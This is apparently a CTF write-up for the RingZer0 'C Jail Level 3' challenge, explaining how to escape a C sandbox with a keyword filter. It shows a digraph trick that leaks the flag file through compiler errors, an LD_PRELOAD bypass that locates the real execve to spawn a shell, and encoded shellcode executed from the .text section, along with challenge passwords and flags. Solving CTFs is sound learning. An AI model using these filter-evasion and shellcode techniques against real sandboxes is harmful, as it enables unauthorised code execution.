# Level 3
```shell
ssh level3@challenges.ringzer0team.com -p 10230 
password: FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
```
![](https://i.imgur.com/Xa81bnR.png)

```shell
RingZer0 Team Online CTF

C Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here's the default includes
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

You CANNOT use the "asm,open,read,mmap,brk,sh,#,sys,\x" keyword

-----------------------------
Your C code:
```

All usable functions in past chanllenge should be denied this time, `#include`, `#define`, `Hex`shellcode will not work either.

I should look for an "old function" which could do the same.

At [https://www.gnu.org/software/libc/manual/html_node/Function-Index.html](https://www.gnu.org/software/libc/manual/html_node/Function-Index.html) you can find all libc functions available. But I had to do some filtering:

* since the open and read keywords weren't allowed, I wasn't able to create any file streams (FILE) or file descriptors* (int fd)
that means that all functions taking a `FILE *` pointer or a file descriptor `int fd` weren't suitable
* the exec* family (execl, execlp, execle, execv, execvp, execvpe) was also not a good ideea since these functions were disabled by the `LD_PRELOAD` override
* `malloc` was also disabled by the override so no functions using malloc internally could be used

Unfortunately, they all dead.

Maybe I should find some way to bypass new restrict: `#`.

Therefore I can include `flag.txt` to make compiler output the error messages which should contain the source code of `flag.txt`.

At least, I can try to include some vulnarable lib?

Finally, BLOG.DORNEA.NU said that there might be a way to accomplish "#include" without using "#". The hint was called [Digraphs/Trigraphs](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs). Especially for the C language, the preprocessor is able to replace digraphs/trigraphs by their [single-character equivalents before any other processing](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C). This way I was able to make the error message:

| digraphs | equivalents | 
| -------- | -------- |
|<:|	[|
|:>|	]|
|<%|	{|
|%>|	}|
|%:|	#|


```c
Your C code:
%:include "/home/level3/flag.txt"
DONE

-----------------------------
Compiling your code.
In file included from /tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:13:0:
/home/level3/flag.txt: In function ‘_24f9c1e3682289873677f3f7f79ea8df’:
/home/level3/flag.txt:1:1: error: ‘FLAG’ undeclared (first use in this function)
 FLAG-BE79t326XS03122r5A4206tv395P64WB
 ^
/home/level3/flag.txt:1:1: note: each undeclared identifier is reported only once for each function it appears in
/home/level3/flag.txt:1:6: error: ‘BE79t326XS03122r5A4206tv395P64WB’ undeclared (first use in this function)
 FLAG-BE79t326XS03122r5A4206tv395P64WB
      ^
/tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:16:1: error: expected ‘;’ before ‘}’ token
 }
 ^
Your code does not compile.
```
![](https://i.imgur.com/qQoSSHh.png)

There we go: `FLAG-BE79t326XS03122r5A4206tv395P64WB`


## Other solutions

Bypass `LD_PRELOAD`
As I've noticed some functions (among these also `execve()`) were disabled due to the `LD_PRELOAD` override. Some [smart guy](https://ringzer0team.com/profile/2319) managed it to find in memory the real libc functions and thus bypassing the `LD_PRELOAD` override. Using [libcdb.com](http://libcdb.com/) you can identify the exact version of the used libc version by finding out the addresses of some functions (in his case `puts` and `printf`):

```c
Compiling your code.
Executing your code.
puts: 0x7ffe36166e30
printf: 0x7ffe3614b400
```

After finding the exact libc version, he/she downloaded the file and had a look at it:

```shell
readelf -s libc-2.19_15.so | grep puts
   184: 000000000006fe30   399 FUNC    GLOBAL DEFAULT   12 _IO_puts@@GLIBC_2.2.5
   400: 000000000006fe30   399 FUNC    WEAK   DEFAULT   12 puts@@GLIBC_2.2.5      <--- the one we have
   471: 00000000000fef10  1031 FUNC    GLOBAL DEFAULT   12 putspent@@GLIBC_2.2.5      
   644: 0000000000100900   555 FUNC    GLOBAL DEFAULT   12 putsgent@@GLIBC_2.10
  1089: 000000000006e730   303 FUNC    WEAK   DEFAULT   12 fputs@@GLIBC_2.2.5
  1597: 000000000006e730   303 FUNC    GLOBAL DEFAULT   12 _IO_fputs@@GLIBC_2.2.5
  2199: 0000000000073a80    95 FUNC    GLOBAL DEFAULT   12 fputs_unlocked@@GLIBC_2.2.5

greadelf -s libc-2.19_15.so | grep execve
   987: 00000000000c1360   200 FUNC    GLOBAL DEFAULT   12 fexecve@@GLIBC_2.2.5
  1418: 00000000000c1330    34 FUNC    WEAK   DEFAULT   12 execve@@GLIBC_2.2.5    <--- the one we want
```  

By calculating the offset between `puts` and `execve` he/she could then build following code:

```c
int (*real_execve)(const char *, char *const *, char * const *) = (void*)puts + <OFFSET>;
char program[] = {47, 98, 105, 110, 47, 98, 97, 115, 104, 0};
real_execve(program, 0, 0);
```

## Execute shellcode
Since I was initially trying to execute shellcode, I was very curios about any similar solutions. [killer2](https://ringzer0team.com/profile/5732) had a very elegant solution:

```c
// Place the shellcode inside the .text section
static const char __attribute__((section (".text"))) code[] = { 72,129,236,255,15,0,0,72,49,255,72,141,52,36,106,50,90,72,49,192,15,5,72,135,254,72,49,246,106,2,88,15,5,72,141,52,36,106,100,90,72,151,72,49,192,15,5,106,1,95,72,137,194,106,1,88,15,5,72,129,196,255,15,0,0,195 };

// Run the shellcode
(*(void(*)())code)();
```
